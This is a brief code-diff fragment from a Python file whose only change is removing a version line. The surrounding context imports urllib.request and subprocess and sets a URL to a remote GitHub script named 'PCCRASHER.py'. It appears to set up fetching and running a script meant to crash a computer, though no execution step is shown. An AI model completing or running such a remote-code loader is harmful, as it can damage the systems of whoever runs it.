@@ -9,7 +9,6 @@
 
 import urllib.request
 import subprocess
-version = '0.0.1'
 
 # Define the URL of the raw GitHub file
 github_raw_url = "https://raw.githubusercontent.com/xJustBen/PyProject/main/PCCRASHER.py"
